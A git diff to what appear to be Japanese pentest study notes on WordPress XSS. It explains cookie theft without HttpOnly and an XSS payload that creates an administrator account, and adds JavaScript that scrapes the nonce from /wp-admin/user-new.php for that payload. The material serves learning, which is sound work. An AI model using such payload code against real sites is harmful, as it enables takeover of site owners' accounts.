@@ -70,3 +70,17 @@ console.log(a)
 - JSコードを実行して、ユーザのCookieとセッション情報を盗むことで、権限昇格につなげることができる
 - このとき、CookieにHttpOnlyフラグが適用されていると、JSからCookieへのアクセスを拒否するようにできるが、このフラグが設定されていなければ、XSSペイロードによってCookieを盗める。
 - もしくは、管理者アカウントを追加するJSを書いてそれをXSSペイロードにすることで、実際の管理者がコードを実行すれば、管理者アカウントが作成される。
+
+> [!NOTES]
+> WordPressには**nonce**値というものがあり、正当なページからの遷移であることを証明するためのワンタイムパスワードとして機能している。このnonce値が分かっていないと、ページからJSを実行しようとしても処理が受け入れられないので注意。このnonce値をURLのクエリストリングの中に<nonce=>として入れる必要がある。
+
+以下のJSコードで、nonce値をページから正規表現を使って探すことができる。
+```.js
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+```
